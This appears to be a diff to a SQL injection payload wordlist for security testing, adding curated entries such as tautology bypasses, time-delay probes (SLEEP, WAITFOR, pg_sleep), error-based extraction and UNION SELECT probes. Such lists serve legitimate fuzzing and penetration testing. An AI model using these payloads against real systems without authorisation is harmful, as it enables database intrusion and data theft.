@@ -12,7 +12,7 @@
 1' OR '1'='1'/*
 1" OR "1"="1
 1 OR 1=1--
-' OR 1=1--
+' OR 1=1 --+
 ' OR 'a'='a
 1' AND SLEEP(3)--
 1'; WAITFOR DELAY '0:0:3'--
@@ -54,3 +54,47 @@ OR 1=1
 1 AND updatexml(1,concat(0x7e,version()),1)--
 1' OR pg_sleep(3)--
 1; SELECT pg_sleep(3)--
+
+# Curated additions from Auto_Wordlists/sqli.txt; destructive statements excluded
+" OR "" = "
+" OR 1 = 1 -- -
+" or "a"="a
+" or 0=0 --
+" or 1=1--
+%20or%20''='
+%20or%20'x'='x
+%20or%201=1
+' OR '' = '
+' OR '1
+' OR 'x'='x
+' OR 1 -- -
+' OR 1=1
+' OR 1=1--
+') OR ('a'='a
+')%20or%20('x'='x
+1' OR 'x'='x
+1') OR ('1'='1' /*
+1') AND ('1'='2' /*
+1 AND (1=1)
+1 AND (1=2)
+1 UNION SELECT NULL /*
+1 UNION ALL SELECT NULL--
+1 ORDER BY 1--
+1 ORDER BY 10--
+admin' or '
+anything' OR 'x'='x
+hi' or 'a'='a
+hi' or 'x'='x';
+or 0=0 #
+or 0=0 --
+or (1=1)
+or 1=1 /*
+or a=a--
+order by
+group by
+having 1=1--
+UNION SELECT
+UNION ALL SELECT
+WHERE 1=1 AND 1=0
+WHERE 1=1 AND 1=1
+uni/**/on sel/**/ect
